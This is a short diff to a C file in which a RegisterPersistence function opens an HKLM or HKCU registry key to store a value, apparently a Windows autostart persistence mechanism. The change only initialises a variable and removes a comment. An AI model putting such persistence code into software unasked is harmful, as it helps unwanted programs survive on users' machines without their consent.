@@ -1,8 +1,8 @@
 #include "../include/config.h"
 
 BOOL RegisterPersistence(void) {
-    HKEY hKey = NULL;  // Initialize hKey to NULL
-    LONG ret;
+    HKEY hKey = NULL;  // Initialize to NULL
+    LONG ret = 0;      // Initialize to 0
 
     printf("[DEBUG] RegisterPersistence: Trying HKLM...\n");
     fflush(stdout);
@@ -78,7 +78,6 @@ BOOL RegisterPersistence(void) {
         printf("[DEBUG] HKCU opened successfully (Handle: %p)\n", (void*)hKey);
         fflush(stdout);
         
-        // Calculate the correct size for wide string
         wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
         size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
         
